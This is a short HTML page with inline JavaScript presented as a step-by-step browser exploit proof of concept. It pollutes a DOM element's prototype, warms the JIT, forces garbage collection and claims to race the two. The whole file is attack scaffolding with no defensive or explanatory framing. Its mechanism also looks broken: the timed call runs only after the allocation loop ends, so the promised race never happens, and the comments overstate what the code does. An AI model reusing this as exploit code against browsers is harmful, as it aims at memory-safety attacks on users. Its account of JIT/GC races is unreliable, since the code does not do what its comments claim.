<!DOCTYPE html>
<div id="target"></div>
<script>
  // Step 1: Create a vulnerable object
  let leakObj = {a: 0x41414141};
  document.getElementById("target").__proto__.evil = leakObj;

  // Step 2: Force JIT compilation of a DOM accessor
  function triggerRace() {
    let x = document.getElementById("target").evil;
    return x.a; // JIT assumes 'evil' is stable
  }

  // Step 3: Warm up JIT (monomorphic call)
  for (let i = 0; i < 100000; i++) {
    triggerRace();
  }

  // Step 4: Trigger GC during JIT execution
  function forceGC() {
    let tmp = [];
    for (let i = 0; i < 1e6; i++) {
      tmp.push(new ArrayBuffer(0x1000));
    }
  }

  // Step 5: Race JIT vs. GC
  setTimeout(() => {
    let res = triggerRace();
    console.log("[!] Race result:", res);
    document.write("Race result: " + res);
  }, 0);

  forceGC(); // Contention point
</script>
